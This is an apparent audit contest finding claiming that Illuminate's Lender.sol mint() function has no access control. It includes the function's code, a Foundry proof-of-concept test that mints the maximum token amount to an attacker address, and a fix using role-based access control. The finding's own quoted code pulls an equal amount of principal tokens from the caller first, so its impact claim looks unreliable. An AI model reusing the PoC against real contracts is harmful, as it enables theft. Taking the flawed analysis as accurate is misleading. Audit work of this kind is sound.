# Any external users can mint any amount of the Illuminate principal tokens due to lack of validations on mint() function in the Lender.sol

## Summary
- Any external users can `mint` any amount of the Illuminate principal tokens due to lack of validations on `mint()` function in the Lender.sol.

## Vulnerability Detail
- Lack of validations on `mint()` function that allow any external users to be able to mint any amount of the Illuminate principal tokens (Illuminate's ERC5095 tokens).

## Impact
- There is no validations such as `access control modifiers` on `mint()` function in the Lender.sol.
   - As a result, any external users can mint any amount of the Illuminate principal tokens (Illuminate's ERC5095 tokens) directly via calling `mint()` function directly. 
     - This lead to an exploit that give large fixed-rate positions to malicious attackers (attacker's wallet or attacker's contract) without lending proper amount of underlying tokens.

## Code Snippet (include PoC)
- This vulnerability is at the line of `mint()` function in the Lender.sol.
  - As we can see code snippet below, there is no validations such as access control modifiers on `mint()` function.
https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L270-L288
```solidity
    function mint(
        uint8 p,
        address u,
        uint256 m,
        uint256 a
    ) external unpaused(u, m, p) returns (bool) {
        // Fetch the desired principal token
        address principal = IMarketPlace(marketPlace).token(u, m, p);

        // Transfer the users principal tokens to the lender contract
        Safe.transferFrom(IERC20(principal), msg.sender, address(this), a);

        // Mint the tokens received from the user
        IERC5095(principalToken(u, m)).authMint(msg.sender, a);

        emit Mint(p, u, m, a);

        return true;
    }
```

   (Code of test exploit of `mint()` method：https://github.com/sherlock-audit/2022-10-illuminate/blob/main/test/exploit/LenderExploit.t.sol#L151-L173 )
```solidity
    //@dev - This is a vulnerability that anyone can mint iPTs (the Illuminate Principal Tokens)
    //@dev - Below is a PoC of exploit of Lender#mint()
    function testExploit_mint() public {
        //@dev - Create a EOA address of an attacker
        address ATTACKER = makeAddr("attacker");

        //@dev - Set the attacker's EOA address as a caller
        vm.startPrank(ATTACKER);

        //@dev - Mint iPTs to the attacker's EOA address
        uint8 p = 1;
        address u = underlying;  // Mock underlying token (ERC20)
        uint256 m = 1;
        //uint256 a = 1;                // Minted-amount is 1
        uint256 a = type(uint256).max;  // Minted-amount is max amount
        bool resultOfMint = l.mint(p, u, m, a);
        assertEq(resultOfMint, true);

        vm.stopPrank();

        //@dev - Check the result whether max amount of iPTs are minted to the attacker's EOA address or not
        uint iptBalanceAfterExploit = ipt.mintCalled(ATTACKER);
        console.log("iPT balance of the attacker's EOA address (after this exploit):", iptBalanceAfterExploit);
        assertEq(iptBalanceAfterExploit, a);
    }
```

   ↓
   - Result of **PoC** above：
      - At first, we can see that an attacker's EOA address `mint` max amount of iPTs. (= 115792089237316195423570985008687907853269984665640564039457584007913129639935)
      - Finally, we can confirm that the iPT balance of an attacker's EOA address after exploit is max amount of iPTs. (by using `IlluminatePrincipalToken#mintCalled()` method)

## Tool used
- Manual Review in Foundry

## Recommendation
- Should implement the [Role-Based Access Control](https://docs.openzeppelin.com/contracts/4.x/access-control#role-based-access-control) in order to mitigate this vulnerability. 
   - For example, using the [Access Control module](https://docs.openzeppelin.com/contracts/4.x/access-control#using-access-control) provided by @openzeppelin/contracts is better to manage access rights of each users.
      - Using `onlyRole()` modifier and `hasRole()` function of @openzeppelin/contracts are useful in order to check whether a caller (msg.sender) of mint() function is the caller who has proper role or not.
